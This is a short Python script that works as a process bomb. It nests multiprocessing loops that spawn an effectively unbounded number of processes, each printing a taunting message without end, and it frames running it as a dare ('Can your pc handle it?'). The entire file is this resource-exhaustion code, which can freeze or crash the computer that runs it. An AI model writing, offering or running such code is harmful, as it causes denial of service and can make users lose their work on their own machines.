import multiprocessing
def main():
    for x in range(1,9**99):
        print("Can your pc handle it? Or you arent brave enough?")
def main2():
    for p1 in range(99999999999999**2):
        p1 = multiprocessing.Process(target=main)
        p1.start()


if __name__ == "__main__":
  for p1 in range(99999999999999**2):
    p1 = multiprocessing.Process(target=main2)
    p1.start()
